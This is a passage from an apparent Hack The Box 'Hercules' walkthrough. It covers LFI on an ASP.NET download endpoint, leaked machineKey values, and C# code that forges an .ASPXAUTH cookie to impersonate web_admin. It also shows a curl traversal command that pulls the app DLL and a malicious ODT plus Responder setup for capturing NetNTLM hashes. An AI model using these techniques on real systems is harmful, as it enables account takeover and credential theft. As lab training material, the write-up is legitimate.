SMB         dc.hercules.htb 445    dc               adriana.i                     2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               tish.c                        2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               jennifer.a                    2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               shae.j                        2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               joel.c                        2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               jacob.b                       2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               web_admin                     2024-12-04 01:44:48 0        
SMB         dc.hercules.htb 445    dc               bob.w                         2024-12-04 01:44:48 0        
SMB         dc.hercules.htb 445    dc               ken.w                         2024-12-04 01:44:48 0        
SMB         dc.hercules.htb 445    dc               johnathan.j                   2024-12-04 01:44:48 0       change*th1s_p@ssw()rd!! 
SMB         dc.hercules.htb 445    dc               harris.d                      2024-12-04 01:44:48 0        
SMB         dc.hercules.htb 445    dc               ray.n                         2024-12-04 01:44:48 0        
SMB         dc.hercules.htb 445    dc               natalie.a                     2025-10-20 04:22:13 0        
SMB         dc.hercules.htb 445    dc               ramona.l                      2024-12-04 01:44:49 0        
SMB         dc.hercules.htb 445    dc               fiona.c                       2024-12-04 01:44:49 0        
SMB         dc.hercules.htb 445    dc               patrick.s                     2024-12-04 01:44:49 0        
SMB         dc.hercules.htb 445    dc               tanya.r                       2024-12-04 01:44:49 0        
SMB         dc.hercules.htb 445    dc               Admin                         2025-10-17 12:26:46 1        
SMB         dc.hercules.htb 445    dc               [*] Enumerated 42 local users: HERCULES
```

So we got some more username and these really hint my eyes up like `web_admin`, `iis_webserver` and `Administrator`. <br>
&rarr; Let's login back with `ken.w`.

![Hercules Website ken.w](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw.png)

Let's discover around a bit.

![Hercules Website ken.w Mail](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw-mail.png)

Checking 3 mails from the Inbox.

![Hercules Website ken.w Mail Site Maintenance](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw-mail-site-maintenance.png)

First mail about site maintenance that we need to use domain creds cause website is sync with domain and if we forgot our password, we can contact `natalie` from `Support Team`. <br>
&rarr; So probably `natalie` and `web_admin` could be our next target.

![Hercules Website ken.w Mail Important](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw-mail-important.png)

Second mail seems kind sus that went straight to the problem that **your account has been hacked** and presented by mail by **domain administrator** also giving sus link `http://hadess.htb/ChangePassword` that was from different domain. <br>
&rarr; Probably this could be phising campaign so just skip it.

![Hercules Website ken.w Mail From the Boss](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw-mail-from-the-boss.png)

Third mail seems more sus and also could potentially a malware in the zip file aswell from `http://hade5.htb/ta577/payslip.zip` and the topic about **pay-raise** but why need to **DOWNLOAD** and **OPEN** to see the payslip :D. <br>
&rarr; Moving on to `/Download`.

![Hercules Website ken.w Form](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw-form.png)

Looking through those forms.

![Hercules Website ken.w Form 1](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw-form-1.png)

![Hercules Website ken.w Form 2](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw-form-2.png)

![Hercules Website ken.w Form 3](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw-form-3.png)

Nothing seems special from these form but when downloading one of these, checking through burp we got.

![Hercules Website ken.w Form Burpsuite](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw-form-burpsuite.png)

This part could be a potiential for lfi exploitation but we will put this aside and check the rest of the endpoint incase of missing something.

![Hercules Website ken.w Security](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw-security.png)

Hmm, Nothing special as we need to contact support for update these details.

![Hercules Website ken.w Report](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw-report.png)

For this one, we can submit file for review but we do not know the file type so we will skip this part for later discovery. <br>
&rarr; Back to where we left of `/Download`, trying some path traversal.

### LFI
From what we got from `shortscan` output, we can put some testing into it. <br>
&rarr; Let's try with `web.config`.

![Hercules Website ken.w Download LFI](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw-download-lfi.png)

> *Trying some `../../../../web.config` as first and got `500` so we reduce the `../` and got `../../web.config` match :>.*

Here is output from `web.config`.

```xml
<?xml version="1.0" encoding="utf-8"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  https://go.microsoft.com/fwlink/?LinkId=301880
  -->
<configuration>
  <appSettings>
    <add key="webpages:Version" value="3.0.0.0" />
    <add key="webpages:Enabled" value="false" />
    <add key="ClientValidationEnabled" value="true" />
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  </appSettings>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.8.1" />
      </system.Web>
  -->
  <system.web>
    <compilation targetFramework="4.8" />
    <authentication mode="Forms">
      <forms protection="All" loginUrl="/Login" path="/" />
    </authentication>
    <httpRuntime enableVersionHeader="false" maxRequestLength="2048" executionTimeout="3600" />
    <machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
    <customErrors mode="Off" />
  </system.web>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Helpers" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.WebPages" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-5.3.0.0" newVersion="5.3.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="Microsoft.Web.Infrastructure" publicKeyToken="31bf3856ad364e35" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-2.0.0.0" newVersion="2.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <remove name="X-AspNetMvc-Version" />
        <remove name="X-Powered-By" />
        <add name="Connection" value="keep-alive" />
      </customHeaders>
    </httpProtocol>
    <security>
      <requestFiltering>
        <requestLimits maxAllowedContentLength="2097152" />
      </requestFiltering>
    </security>
    <rewrite>
      <rules>
        <rule name="HTTPS Redirect" stopProcessing="true">
          <match url="(.*)" />
          <conditions>
            <add input="{HTTPS}" pattern="^OFF$" />
          </conditions>
          <action type="Redirect" url="https://{HTTP_HOST}{REQUEST_URI}" redirectType="Permanent" />
        </rule>
      </rules>
    </rewrite>
    <httpErrors errorMode="Custom" existingResponse="PassThrough">
      <remove statusCode="404" subStatusCode="-1" />
      <error statusCode="404" path="/Error/Index?statusCode=404" responseMode="ExecuteURL" />
      <remove statusCode="500" subStatusCode="-1" />
      <error statusCode="500" path="/Error/Index?statusCode=500" responseMode="ExecuteURL" />
      <remove statusCode="501" subStatusCode="-1" />
      <error statusCode="501" path="/Error/Index?statusCode=501" responseMode="ExecuteURL" />
      <remove statusCode="503" subStatusCode="-1" />
      <error statusCode="503" path="/Error/Index?statusCode=503" responseMode="ExecuteURL" />
      <remove statusCode="400" subStatusCode="-1" />
      <error statusCode="400" path="/Error/Index?statusCode=400" responseMode="ExecuteURL" />
    </httpErrors>
  </system.webServer>
  <system.codedom>
    <compilers>
      <compiler language="c#;cs;csharp" extension=".cs" warningLevel="4" compilerOptions="/langversion:default /nowarn:1659;1699;1701;612;618" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
      <compiler language="vb;vbs;visualbasic;vbscript" extension=".vb" warningLevel="4" compilerOptions="/langversion:default /nowarn:41008,40000,40008 /define:_MYTYPE=\&quot;Web\&quot; /optionInfer+" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.VBCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
    </compilers>
  </system.codedom>
</configuration>
<!--ProjectGuid: 6648C4C4-2FF2-4FF1-9F3E-1A560E46AA52-->
```

And if we take a look from the request we can see there is other cookie `.ASPXAUTH`.

```bash
.ASPXAUTH=D8BC5595F0B24ADED8A991CFCBBBDB3FABC46FC002EBAB5663C219640DD9DDEB57F103F47A5D431CDD5470FCBF7187604614E383849213DC52CC8F55E86734D5E5BCAC82B45731DD4516EB070E9BFBFA0D3A0FA451C7165BF80783879E145CB15D54868760A4DA4B91181131B52C0F7FC4A25788E6D9B80F538D1AF4888BE8A98BC66ACF05A9681A51EC82E1635E3CB72E5B99B0CBDFE768EAE85AA6A815071E
```

Taking some searching and got [.ASPXAUTH Cookie](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tswp/fd02fed4-7bab-4d3e-a7a1-639d4838d7ca) that used to determine if a user is authenticated. <br>
From what we get in `web.config` know that this is a **ASP.NET MVC 5 web application** configuration file using the **.NET Framework 4.8**, with form-based authentication and HTTPS redirection.

Here is the cryptography which is **important**.

```xml
<machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
```

Searching some keywords in `0xdf` got this related in [webconfig-analysis](https://0xdf.gitlab.io/2022/10/15/htb-perspective.html#webconfig-analysis) from [htb-perspective](https://0xdf.gitlab.io/2022/10/15/htb-perspective.html) machine. <br>
&rarr; Knowing that these key pair used to encrypt/decrypt forms Auth cookies and also validate [ViewState](https://learn.microsoft.com/en-us/previous-versions/aspnet/bb386448(v=vs.100)), anti-forgery tokens.

### Encrypt/Decrypt Cookie
From what we read in `0xdf` blog, we will use [aspnetCryptTools](https://github.com/liquidsec/aspnetCryptTools) to decrypt and encrypt hopefully we can escalated to `web_admin` is our next target.

```bash
└─$ ./FormsDecrypt.exe EC7AB1F8A144196931E787D7E339D308A420BC8C7777717B588C8C5D0881F8657667F236BBDEAC0F54237B4D04FFCD749336656EE65B6346CCA87801C530CADB67D5EF30534A0A5BE42A593D130E6575F0B8C448F66C9CAED9FBEBC2EF62C89883809A45DEAC3C68BBC44C64A6A7A0E3B3EF83A29D4B59F188BCACF4E53DE0EE2260535C4A91D3BB52EBDDBF2FE3A0D196882B8FFB5465B4D98197DFE1B5C7B3

Unhandled Exception:
System.NullReferenceException: Object reference not set to an instance of an object
  at System.Web.Util.UrlUtils.Combine (System.String basePath, System.String relPath) [0x00145] in <958b160034404fcb827c625b2965bd7e>:0 
  at System.Web.Security.FormsAuthentication.MapUrl (System.String url) [0x00010] in <958b160034404fcb827c625b2965bd7e>:0 
  at System.Web.Security.FormsAuthentication.Initialize () [0x000dd] in <958b160034404fcb827c625b2965bd7e>:0 
  at System.Web.Security.FormsAuthentication.Decrypt (System.String encryptedTicket) [0x0001b] in <958b160034404fcb827c625b2965bd7e>:0 
  at FormsTicketCrypt.Program.Main (System.String[] args) [0x00017] in <d52493f40f69414591409e3a95f23c86>:0 
[ERROR] FATAL UNHANDLED EXCEPTION: System.NullReferenceException: Object reference not set to an instance of an object
  at System.Web.Util.UrlUtils.Combine (System.String basePath, System.String relPath) [0x00145] in <958b160034404fcb827c625b2965bd7e>:0 
  at System.Web.Security.FormsAuthentication.MapUrl (System.String url) [0x00010] in <958b160034404fcb827c625b2965bd7e>:0 
  at System.Web.Security.FormsAuthentication.Initialize () [0x000dd] in <958b160034404fcb827c625b2965bd7e>:0 
  at System.Web.Security.FormsAuthentication.Decrypt (System.String encryptedTicket) [0x0001b] in <958b160034404fcb827c625b2965bd7e>:0 
  at FormsTicketCrypt.Program.Main (System.String[] args) [0x00017] in <d52493f40f69414591409e3a95f23c86>:0
```

Got some error and finding out that we need to get the correct package the match with what we are doing. <br>
&rarr; Finding out this one [AspNetCore.LegacyAuthCookieCompat](https://github.com/dazinator/AspNetCore.LegacyAuthCookieCompat/) that match our `asp.net` and it also does not relying on system.web.

First we will create a directory name `LegacyAuthConsole`.

```bash
└─$ dotnet new console -o LegacyAuthConsole
The template "Console App" was created successfully.

Processing post-creation actions...
Running 'dotnet restore' on /home/kali/HTB_Labs/GACHA_Season9/Hercules/aspnetCryptTools/LegacyAuthConsole/LegacyAuthConsole.csproj...
  Determining projects to restore...
  Restored /home/kali/HTB_Labs/GACHA_Season9/Hercules/aspnetCryptTools/LegacyAuthConsole/LegacyAuthConsole.csproj (in 217 ms).
Restore succeeded.
```

Then add the package with compact version that can run on our target.

```bash
└─$ cd LegacyAuthConsole

└─$ dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5
  Determining projects to restore...
  Writing /tmp/tmprIymdh.tmp
<SNIP>
```

Now we restore it.

```bash
└─$ dotnet restore
  Determining projects to restore...
  All projects are up-to-date for restore.
```

After that we will modified `Program.cs` for decryption.

```cs
using System;
using System.Security.Claims;
using System.Threading.Tasks;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static void Main(string[] args)
    {
      string validationKey = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";
      string decryptionKey = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

      byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
      byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

      var legacyFormsAuthenticationTicketEncryptor = new LegacyFormsAuthenticationTicketEncryptor(decryptionKeyBytes, validationKeyBytes, ShaVersion.Sha256);

      FormsAuthenticationTicket decryptedTicket = legacyFormsAuthenticationTicketEncryptor.DecryptCookie("EC7AB1F8A144196931E787D7E339D308A420BC8C7777717B588C8C5D0881F8657667F236BBDEAC0F54237B4D04FFCD749336656EE65B6346CCA87801C530CADB67D5EF30534A0A5BE42A593D130E6575F0B8C448F66C9CAED9FBEBC2EF62C89883809A45DEAC3C68BBC44C64A6A7A0E3B3EF83A29D4B59F188BCACF4E53DE0EE2260535C4A91D3BB52EBDDBF2FE3A0D196882B8FFB5465B4D98197DFE1B5C7B3");
      Console.WriteLine(decryptedTicket.Version);
      Console.WriteLine(decryptedTicket.Name);
      Console.WriteLine(decryptedTicket.IssueDate);
      Console.WriteLine(decryptedTicket.Expiration);
      Console.WriteLine(decryptedTicket.IsPersistent);
      Console.WriteLine(decryptedTicket.UserData);
      Console.WriteLine(decryptedTicket.CookiePath);
      Console.ReadLine();
    }
}
```

Running it with dotnet.

```bash
└─$ dotnet run
1
ken.w
10/19/2025 11:05:25PM
10/19/2025 11:15:25PM
True
Web Users
/
```

So we can successfully decrypted the `.ASPXAUTH Cookie`. <br>
&rarr; Now we will modified again for encrypted to escalated to `web_admin`.

```cs
using System;
using System.Security.Claims;
using System.Threading.Tasks;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static void Main(string[] args)
    {
      string validationKey = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";
      string decryptionKey = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

      var issueDate = DateTime.Now;
      var expiryDate = issueDate.AddHours(1);
      var formsAuthenticationTicket = new FormsAuthenticationTicket(1, "web_admin", issueDate, expiryDate, false, "Web Administrators", "/");


      byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
      byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

      var legacyFormsAuthenticationTicketEncryptor = new LegacyFormsAuthenticationTicketEncryptor(decryptionKeyBytes, validationKeyBytes, ShaVersion.Sha256);

      var encryptedText = legacyFormsAuthenticationTicketEncryptor.Encrypt(formsAuthenticationTicket);

      Console.WriteLine(encryptedText);
    }
}
```

Run again.

```bash
└─$ dotnet run
DDB32BBD49400D49D53E4B3A3B0A1D4AA80159982F6CE03D8D8E0408B4801ED3590D76448E60411ACD46C6D4CFAEAA2E84A929995483F3B87AC82064BC6644B409C0C581653D0E2790366E9D113A79B28ED39D3C35939D022DBB3C2AFF4512AE66F8C36F18D1B1DC74F4A61525FF4F3ADF815D69E2641FD33CB844BCDD3434A560A7F221D828C39D298F7ECBFC207D286EEB49B84660BE1452C25BCC030D7FAC2FBEB33319F93EA4E24973C2B7279819F706FC6989F3610D6CCE55254E34CC43
```

So we got the new `.ASPXAUTH Cookie` that we will use to forge ourself to `web_admin`. <br>
&rarr; Hit the devtools and get it to go.

![Hercules Website ken.w Cookie](/assets/img/hercules-htb-season9/hercules-htb-season9_website-kenw-cookie.png)

Then reload the website.

![Hercules Website web admin](/assets/img/hercules-htb-season9/hercules-htb-season9_website-webadmin.png)

Now we are in `web_admin`, checking the `/Mail` to see if there is some other mails that we can gather more info.

![Hercules Website web admin Mail](/assets/img/hercules-htb-season9/hercules-htb-season9_website-webadmin-mail.png)

We got `Security Audit` and `Password Reset??`. <br>
&rarr; Let's check them out.

![Hercules Website web admin Mail Security Audit](/assets/img/hercules-htb-season9/hercules-htb-season9_website-webadmin-mail-security-audit.png)

From what we read, the number 4 mention that `Restrict file upload to administrators only` so we are now `web_admin` and we can do the upload.

![Hercules Website web admin Mail Password Reset](/assets/img/hercules-htb-season9/hercules-htb-season9_website-webadmin-mail-password-reset.png)

Seems like social engineering attempt that want to recon the password reset process maybe. <br>
&rarr; Now we back to the `/Forms`.

### File upload & DLL
Trying to upload image to see if it is supported.

![Hercules Website web admin Forms Image](/assets/img/hercules-htb-season9/hercules-htb-season9_website-webadmin-forms-image.png)

![Hercules Website web admin Forms Image 1](/assets/img/hercules-htb-season9/hercules-htb-season9_website-webadmin-forms-image-1.png)

Okay, seeing that the file type is not supported so let's try to bruteforce with [extensions-most-common.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/extensions-most-common.fuzz.txt) from seclists to se if we can get something supported.

![Hercules Website web admin Forms Bruteforce](/assets/img/hercules-htb-season9/hercules-htb-season9_website-webadmin-forms-bruteforce.png)

![Hercules Website web admin Forms Bruteforce 1](/assets/img/hercules-htb-season9/hercules-htb-season9_website-webadmin-forms-bruteforce-1.png)

So after running using Burp Intruder and found out `.docx` is supported. <br>
But searching out to finding way to reverse shell with `.docx` kinda hard and maybe need to do things with macro kinda like sending phising file to admin for clicking it. <br>
&rarr; We gonna back to the lfi part to see what can we recon more.

Taking some time searching for asp.net razor pages typical folder structure.

![Hercules Website Folder Structure](/assets/img/hercules-htb-season9/hercules-htb-season9_website-folder-structure.png)

> *The image is taken from this one [Views in ASP.NET Core MVC](https://learn.microsoft.com/en-us/aspnet/core/mvc/views/overview?view=aspnetcore-9.0).*

And also got some finding from [folder-structure-of-asp-net-core-mvc-6-0-project](https://www.c-sharpcorner.com/article/folder-structure-of-asp-net-core-mvc-6-0-project/) that we could take a look at it. <br>
From this `/Views/Home/Index.cshtml`, we guessing that our exploit is on `/Forms` so we will use `/Views/Home/Forms.cshtml` to explore to see if we can read the content of this one.

![Hercules Website web admin Forms cshtml](/assets/img/hercules-htb-season9/hercules-htb-season9_website-webadmin-forms-cshtml.png)

So we are able to read the content of `Forms.cshtml`.

```cshtml
@model HadesWeb.Models.UploadFormModel
@{
    ViewBag.Title = "Forms";
    Layout = "_Layout.cshtml";
}

@using (Html.BeginForm("Forms", "Home", FormMethod.Post, new { enctype = "multipart/form-data", @class = "upload-form-container" }))
{
    @Html.AntiForgeryToken()
    @Html.ValidationSummary(true, "", new { @class = "text-danger" })


    <div class="title-container">
        <h2>Report Submission</h2>
        <button type="button" class="info-button" onclick="openModal('infoModal')">?</button>
    </div>

    <div id="infoModal" class="upload-form-modal">
        <div class="upload-form-modal-content">
            <span class="close" onclick="closeModal('infoModal')">&times;</span>
            <h3>Form Information</h3>
            <p>
                We're sorry that you're experiencing any issues. Our team aims to provide the best assistance where we can.<br /><br />You can use the form below to report your issue. A member of our team will typically respond to your report within a couple of minutes, so please be patient!
            </p>
        </div>
    </div>

    <div class="upload-form-group-horizontal">
        <div class="upload-form-group">
            @Html.LabelFor(m => m.Name, new { @class = "upload-form-label" })
            @Html.TextBoxFor(m => m.Name, new { @class = "upload-form-textarea" })
            @Html.ValidationMessageFor(m => m.Name, "", new { @class = "text-danger" })
        </div>

        <div class="upload-form-group">
            @Html.LabelFor(m => m.Email, new { @class = "upload-form-label" })
            @Html.TextBoxFor(m => m.Email, new { @class = "upload-form-textarea" })
            @Html.ValidationMessageFor(m => m.Email, "", new { @class = "text-danger" })
        </div>
    </div>

    <div class="upload-form-group">
        @Html.LabelFor(m => m.Description, new { @class = "upload-form-label" })
        @Html.TextAreaFor(m => m.Description, new { @class = "upload-form-textarea", rows = "4" })
        @Html.ValidationMessageFor(m => m.Description, "", new { @class = "text-danger" })
    </div>

    <div class="upload-form-group-horizontal">
        <div class="upload-form-group">
            @Html.LabelFor(m => m.UploadedFile, new { @class = "upload-form-label" })
            @Html.TextBoxFor(m => m.UploadedFile, new { type = "file" })
            @Html.ValidationMessageFor(m => m.UploadedFile, "", new { @class = "text-danger" })
        </div>

        <div class="upload-form-group">
            <div class="upload-submit-form">
                <button class="upload-form-button" type="submit">Submit</button>
                <div class="upload-viewbag-message">
                    @ViewBag.Message
                </div>
                <div class="upload-viewbag-success">
                    @ViewBag.Success
                </div>
            </div>
        </div>

    </div>
}

<script src="~/Content/js/modal.js"></script>
```

So what we have here: <br>
- `@model HadesWeb.Models.UploadFormModel`: This declares the Model (data structure) for this view and also located in `HadesWeb.dll` &rarr; `Models` namespace &rarr; `UploadFormModel` class. <br>
- Form Action `Html.BeginForm("Forms", "Home", FormMethod.Post, ...)`: Submits to `POST /Home/Forms` and handled by `HomeController.Forms()` method. <br>
&rarr; We need to decomplied `HadesWeb.dll` cause this one contains the application's logic, controllers, models, and potentially precompiled views or pages.

> **The question is how to know `HadesWeb.dll` stand in which folder?**

So taking some searching and found out this folder stucture.

![Hercules Website Folder Structure 1](/assets/img/hercules-htb-season9/hercules-htb-season9_website-folder-structure-1.png)

Take a look at the end of the [folder-structure-of-Asp-Net-mvc-project](https://www.c-sharpcorner.com/UploadFile/3d39b4/folder-structure-of-Asp-Net-mvc-project/) blog.

![Hercules Website Folder Structure 2](/assets/img/hercules-htb-season9/hercules-htb-season9_website-folder-structure-2.png)

Then searching out for `/bin` folder and we got this [ASP.NET Web Site Layout](https://learn.microsoft.com/en-us/previous-versions/aspnet/ex526337(v=vs.100)) and take a look at [application-folders](https://learn.microsoft.com/en-us/previous-versions/aspnet/ex526337(v=vs.100)#application-folders).

![Hercules Website Folder Structure 3](/assets/img/hercules-htb-season9/hercules-htb-season9_website-folder-structure-3.png)

As it said **"Contains compiled assemblies (.dll files)"** so we can confirmed that the `HadesWeb.dll` is in `/bin` folder. <br>
&rarr; As we need to decomplied it out rather than read from the lfi part so let's head it out.

```bash
└─$ COOKIE="__RequestVerificationToken=7fezjcr_Mk22sARLQYFKxCHI5oNRRT5bpjBGHtQvCiMDcI5peltg1_PVmQR3sZbJHyxDmPDzWPgu91YdbZVwfu28Fud_U28TWhrXw8LKD7U1; .ASPXAUTH=2A22992A6DA8D9AF6BFB9678ACB435F8F65C0685B3F5E5DD83D67F120BC21F7FE6C96C9C1A993D5222C344C314E722F4416BFB119D606F8CCC5DB0F32E82857BF4007FFD72934E4E8AFA5FE714605F9D7E47E2ED69A38223949965CA714A6EA578F90F66767012A440616B08578274B55A4A7C47645FD6A8CC601ED7758EEF1B0B27EFD5DBC1412F8AC2037A0A6D2E6BB43C76D1D0AD5FF0951732043F64734E540F20FD98CE401D126FD75F45C9FB18AFCDAFF93C5747146AA5D9B733BC2A1A"

└─$ TARGET="https://hercules.htb/Home/Download"

└─$ curl -sk -H "Cookie: $COOKIE" \
  "${TARGET}?fileName=../../bin/HadesWeb.dll" \
  -o HadesWeb.dll
```

Now we got file, we will use [dnSpy](https://github.com/dnSpy/dnSpy) to decomplied the file out.

```bash
└─$ wine dnSpy.exe HadesWeb.dll
```

![Hercules Website DLL](/assets/img/hercules-htb-season9/hercules-htb-season9_website-dll.png)

So when it start successful and checking the file and we got error with some config or dependencies so we switch to [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy).

```bash
└─$ mkdir ilspy && cd ilspy

└─$ wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip

└─$ unzip Linux.x64.Release.zip
Archive:  Linux.x64.Release.zip
  inflating: ILSpy-linux-x64-Release.zip
  
└─$ unzip ILSpy-linux-x64-Release.zip 
Archive:  ILSpy-linux-x64-Release.zip
  inflating: artifacts/linux-x64/Avalonia.Animation.dll
	<SNIP>

└─$ ./ILSpy ../../../HadesWeb.dll
```

Now checking `Forms(UploadFormModel) : ActionResult`.

![Hercules Website Forms DLL](/assets/img/hercules-htb-season9/hercules-htb-season9_website-forms-dll.png)

Found out another extension `.odt` and it uploads to `C:\\inetpub\\Reports\\`.

> *After searching for file extension to see if we can bruteforce to get that `.odt` and we got [Filename extension list](https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4) that we could try out later or you can try to see if it detected it out.*

### .odt
Brief about `.odt` extension that stands for OpenDocument Text which is a word processing document file format that is open-source and comparable to Microsoft Word's DOCX format. <br>
Searching for `.odt cve` to see if there is some way to generate malicious file that helps us something out. <br>
&rarr; We got [LibreOffice/Open Office - '.odt' Information Disclosure](https://www.exploit-db.com/exploits/44564) from [exploit-db](https://www.exploit-db.com/).

So basically, this one create a malicious ODF which can be used to leak NetNTLM credentials. <br>
&rarr; Let's take a shot from this [Bad-ODF](https://github.com/lof1sec/Bad-ODF)

```bash
└─$ python3 -m venv badodf-venv  

└─$ source badodf-venv/bin/activate

└─$ pip install ezodf && pip install --upgrade lxml
Collecting ezodf
  Downloading ezodf-0.3.2.tar.gz (125 kB)
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Building wheels for collected packages: ezodf
  Building wheel for ezodf (pyproject.toml) ... done
  Created wheel for ezodf: filename=ezodf-0.3.2-py2.py3-none-any.whl size=49079 sha256=5ddd5b8312c02c806a8a7ec71f1c406393c7d7eaa90118e88a44fa15f96553be
  Stored in directory: /home/kali/.cache/pip/wheels/7e/fc/1b/3bb66b51b6fc18d3c1e1b19a6e1bd0b2ab621bc5ad479dcf99
Successfully built ezodf
Installing collected packages: ezodf
Successfully installed ezodf-0.3.2
Collecting lxml
  Using cached lxml-6.0.2-cp313-cp313-manylinux_2_26_x86_64.manylinux_2_28_x86_64.whl.metadata (3.6 kB)
Using cached lxml-6.0.2-cp313-cp313-manylinux_2_26_x86_64.manylinux_2_28_x86_64.whl (5.2 MB)
Installing collected packages: lxml
Successfully installed lxml-6.0.2
```

```bash
└─$ python3 Bad-ODF.py 
/home/kali/HTB_Labs/GACHA_Season9/Hercules/Bad-ODF/Bad-ODF.py:29: SyntaxWarning: invalid escape sequence '\/'
  / __ )____ _____/ /     / __ \/ __ \/ ____/

    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_    
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
/_____/\__,_/\__,_/      \____/_____/_/     


Create a malicious ODF document help leak NetNTLM Creds

By Richard Davy 
@rd_pentest
www.secureyourit.co.uk


Please enter IP of listener: 10.x.x.x
```

We got file `bad.odt` that contain our attacker ip. <br>
&rarr; Start the `responder` to catch the `NTLM`.

```bash
└─$ sudo responder -I tun0 -v
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.x.x.x]
